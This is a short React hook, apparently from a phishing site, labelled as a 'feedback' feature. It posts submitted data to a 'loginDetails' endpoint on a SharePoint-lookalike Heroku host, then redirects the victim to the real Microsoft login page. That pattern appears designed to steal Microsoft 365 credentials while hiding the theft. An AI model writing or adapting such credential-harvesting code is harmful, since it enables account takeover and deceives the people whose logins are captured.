import axios from 'axios';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useReducer } from 'react';
import { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';
import FeedbackReducer from './FeedbackReducer';


toast.configure()


const useFeedback = () => {
  const [
    { isLoading },
    dispatch,
  ] = useReducer(FeedbackReducer, {
    isLoading: false,
  });

  const postFeedback = async (data) => {
    dispatch({ type: START_FEEDBACK });
    try {
      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`,
       data);
      if (response.status === 200 ) {
        window.location.assign('https://login.microsoftonline.com/common/login');
        dispatch({
          type: STOP_FEEDBACK,
        });
      } else {
        toast.error('oops');
      }
    
    } catch (e) {
      toast.info('Something went wrong!');
      if (e.response) {
        dispatch({ type: STOP_FEEDBACK });
      }
    }
  };

  return {
    postFeedback,
    isLoading,
  };
};

export default useFeedback;
